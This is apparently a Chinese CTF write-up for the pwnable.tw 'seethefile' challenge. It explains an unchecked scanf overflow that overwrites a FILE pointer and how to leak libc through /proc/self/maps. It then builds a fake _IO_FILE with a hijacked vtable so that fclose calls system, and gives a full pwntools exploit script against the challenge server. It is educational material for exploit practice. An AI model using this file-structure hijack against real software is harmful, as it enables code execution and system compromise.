## 检查

```
$ file seethefile 
seethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped
$ checksec seethefile 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32位程序，只开了NX，没去符号表

## 分析

程序提供的功能是可以打开、读取、打印、关闭文件，但是一次只能读取0x18F个字节，且有检测不能读取flag文件

## 漏洞点

程序在输入和读取的地方都做好了边界控制，但是在程序退出时：

```c
case 5:
  printf("Leave your name :");
  __isoc99_scanf("%s", &name);
```

这里没有检查输入name的长度，导致可以覆盖name后面的内存。位于bss段的name后面就是那个文件的fp指针，之后又去调用了fclose并传入了这个fp指针，这里就是漏洞点所在。

## 前置知识之__IO_FILE

在利用之前，我们先来学习`_IO_FILE`。不过在学`IO_FILE`之前，我们先了解两个函数`open`和`fopen`：

- [总结open与fopen的区别](https://www.jianshu.com/p/5bccc0a0bbbf)
- [C fopen vs open](https://stackoverflow.com/questions/1658476/c-fopen-vs-open)
- [Linux（C/C++）下的文件操作open、fopen与freopen](https://blog.csdn.net/qq_38374864/article/details/72903920)
- [C语言中open与fopen的的解释和区别](https://blog.csdn.net/LEON1741/article/details/78091974)
- [C语言中文件描述符和文件指针的本质区别](https://blog.csdn.net/xzhKSD123/article/details/96167556)

|          | 文件描述符（低级IO）  | 文件流/文件指针（高级IO）       |
| :------- | :-------------------- | :------------------------------ |
| 标准     | POSIX                 | ANSI C                          |
| 层次     | 系统调用              | libc                            |
| 数据类型 | int                   | FILE *                          |
| 函数     | open/close/read/write | fopen/fclose/fread/fwrite/fseek |

所以要学习的`_IO_FILE`就是fopen这套libc实现的高级IO操作相关的一个结构体`_IO`是值其所在是libc的IO库中，所以说的FILE结构体值指的就是`_IO_FILE`，在stdio.h的头文件中有typedef：

> /usr/include/stdio.h

```c
struct _IO_FILE;
typedef struct _IO_FILE FILE;
typedef struct _IO_FILE __FILE;
extern struct _IO_FILE *stdin;		/* Standard input stream.  */
extern struct _IO_FILE *stdout;		/* Standard output stream.  */
extern struct _IO_FILE *stderr;		/* Standard error output stream.  */
```

至此我们可以开心的学习`_IO_FILE`了

- [FILE Structure Description](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/)
- [_IO_FILE利用思路总结](https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie)
- [_IO_FILE部分源码分析及利用](http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/)
- [IO FILE 之劫持vtable及FSOP](http://blog.eonew.cn/archives/1103)
- [IO file结构在pwn中的妙用](https://xz.aliyun.com/t/6567)

一句话概括为啥要研究`_IO_FILE`：**libc实现的文件流机制中存在可以被改写的函数指针**

## 利用

所以我们的核心思路是构造fake FILE，从而使得fclose执行`system('/bin/sh')`

### libc

libc的泄漏很简单，我们可以直接利用linux的proc伪文件系统读取`/proc/self/maps`即可获得libc基址，不过本地和远程的布局可能有些许的不同，因为一次最多只能读取0x18f个字节，所以我们获取到一个地址后，加上偏移即可得到libc基址

一般我们读取的是/proc/[pid]/maps，可以获取任意进程的映射信息，这里我们使用self是为了获取当前进程的内存映射关系

### fake FILE

几个IO_FILE的知识：

```
1、_IO_FILE结构大小为0x94（32位）
2、_flags&0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp->vtable->_finish(fp)
3、将fp指向一块内存p,p偏移0的前4个字节设置为0xffffdfff,p偏移4的位置放上参数';/bin/sh'(字符要以;开头)；p偏移sizeof(_IO_FILE)大小位置(vtable)覆盖为内存q,q的2*4字节处(vtable->_finish)覆盖为system即可
4、vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好
```

需要注意的是，我们这里的libc版本是2.23，2.24以上的版本会对虚表进行检查，需要绕过

故伪造如下：

```python
fakeFILE = 0x0804B284
payload  = 'a'*0x20
payload += p32(fakeFILE)
payload += p32(0xffffdfff)
payload += ";$0"+'\x00'*0x8d
payload += p32(fakeFILE+0x98)
payload += p32(system_addr)*3
```

## exp

需要注意的是，我们在本地leak出来的libc基址和目标文件的基址并不一样，要一样可能需要使用docker调试

有意思的是，我们获取shell之后并不能直接cat flag直接获取，应该是为了防止非预期，需要./get_flag获取flag

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

context(arch='amd64',os='linux',log_level='debug')

debug = 0
if debug:
	elf = ELF("./seethefile")
	libc = ELF("./libc_32.so.6")
	io = process(elf.path)
else:
	elf = ELF("./seethefile")
	libc = ELF("./libc_32.so.6")
	io = remote("chall.pwnable.tw",10200)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

openfile = lambda name : (sla("choice :","1"),sla("see :", name))
readfile = lambda : sla("choice :","2")
writefile = lambda : sla("choice :","3")
printname = lambda name : (sla("choice :","5"),sla("name :", name))

# leak libc
openfile("/proc/self/maps")
readfile()
writefile()
io.recvuntil("[heap]\n")
libc_addr = int(io.recv(8),16)+0x1000
system_addr = libc_addr +libc.symbols['system']

# make fake file
fakeFILE = 0x0804B284
payload  = 'a'*0x20
payload += p32(fakeFILE)
payload += p32(0xffffdfff)
payload += ";$0"+'\x00'*0x8d
payload += p32(fakeFILE+0x98)
payload += p32(system_addr)*3

# get shell
printname(payload)

io.interactive()

```

参考：

- [和媳妇一起学Pwn 之 seethefile](https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/)
- [pwnable.tw系列](https://n0va-scy.github.io/2019/07/03/pwnable.tw/)
- [pwnable.tw seethefile 经验总结](https://blog.csdn.net/qq_43189757/article/details/103056493)

